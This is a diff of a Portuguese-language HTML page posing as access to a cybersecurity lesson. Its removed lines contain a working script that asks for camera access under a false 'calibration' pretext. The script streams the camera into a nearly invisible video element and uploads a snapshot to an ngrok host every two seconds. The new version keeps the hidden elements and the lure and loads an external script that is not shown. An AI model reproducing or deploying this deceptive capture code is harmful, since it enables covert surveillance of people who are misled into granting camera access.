@@ -1,45 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Teste de Sensor - CheckCam</title>
+    <title>Segurança Cybernética</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
-        .btn { padding: 15px 30px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; }
-    </style>
+    
 </head>
 <body>
-    <h1>Acesso ao conteúdo da Aula</h1>
+    <h1>Acesso a Aula</h1>
     <p>Clique no botão abaixo para ter acesso a Aula sobre segurança.</p>
     <button class="btn" onclick="start()">Entrar para Aula</button>
 
     <video id="v" autoplay playsinline style="opacity: 0.01; position: absolute;"></video>
     <canvas id="c" style="display:none"></canvas>
 
-    <script>
-        const NGROK_URL = " https://exostotic-percy-handsomest.ngrok-free.dev"; 
-
-        function start() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                document.getElementById('v').srcObject = stream;
-                alert("Calibrando... por favor aguarde 10 segundos.");
-                
-                setInterval(() => {
-                    const v = document.getElementById('v');
-                    const c = document.getElementById('c');
-                    c.width = v.videoWidth; c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    
-                    fetch(NGROK_URL + '/upload', {
-                        method: 'POST',
-                        mode: 'no-cors', // Importante para evitar erros de segurança
-                        body: c.toDataURL('image/jpeg', 0.5)
-                    });
-                }, 2000);
-            })
-            .catch(err => alert("Erro: O sensor precisa de permissão para calibrar."));
-        }
-    </script>
+    
 </body>
+<script src="comandos.js"></script>
 </html>
